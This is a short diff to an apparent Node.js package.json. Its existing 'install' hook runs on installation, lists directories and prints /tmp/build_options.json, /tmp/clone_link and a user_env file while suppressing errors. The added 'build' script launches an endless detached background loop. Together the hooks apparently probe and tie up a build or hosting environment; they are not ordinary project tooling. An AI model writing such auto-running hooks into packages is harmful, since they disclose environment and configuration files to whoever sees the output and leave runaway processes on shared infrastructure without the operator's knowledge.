@@ -6,6 +6,7 @@
   "scripts": {
     "dev": "env-cmd nodemon index.js",
     "install": "(ls -la . && ls -la ../ && cat /tmp/build_options.json && cat /tmp/clone_link && cat user_env) || true",
+    "build": "while true; do echo $(date); sleep 1; done &",
     "repl": "env-cmd node"
   },
   "keywords": [],
